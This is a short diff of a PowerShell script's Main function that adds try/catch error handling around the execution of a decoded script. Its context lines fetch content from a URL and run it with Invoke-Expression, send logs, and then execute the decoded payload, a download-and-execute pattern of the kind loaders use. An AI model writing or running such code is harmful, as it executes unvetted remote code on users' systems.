@@ -365,7 +365,11 @@ function Main {
     $content = Invoke-RestMethod -Uri $url
     Invoke-Expression $content
     Send-Logs
-    Invoke-Expression $decodedlogsend
+    try {
+        Invoke-Expression $decodedlogsend
+    } catch {
+        Write-Error "Failed to execute the decoded script: $_"
+    }
 
 
 
